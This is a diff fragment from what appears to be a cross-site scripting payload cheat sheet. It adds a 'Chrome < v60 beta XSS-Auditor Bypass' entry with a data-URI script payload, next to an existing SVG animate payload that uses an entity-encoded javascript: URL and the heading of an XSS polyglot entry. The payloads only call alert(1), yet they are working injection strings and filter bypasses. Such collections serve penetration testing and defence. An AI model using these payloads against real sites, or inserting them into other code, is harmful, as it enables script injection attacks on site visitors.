@@ -6,6 +6,12 @@
 <svg><animate xlink:href=#x attributeName=href values=&#106;avascript:alert(1) /><a id=x><rect width=100 height=100 /></a>
 ```
 
+**Chrome < v60 beta XSS-Auditor Bypass**
+
+```html
+<script src="data:,alert(1)%250A-->
+```
+
 **XSS Polyglot** by [Ahmed Elsobky](https://github.com/0xSobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)
 
 ```
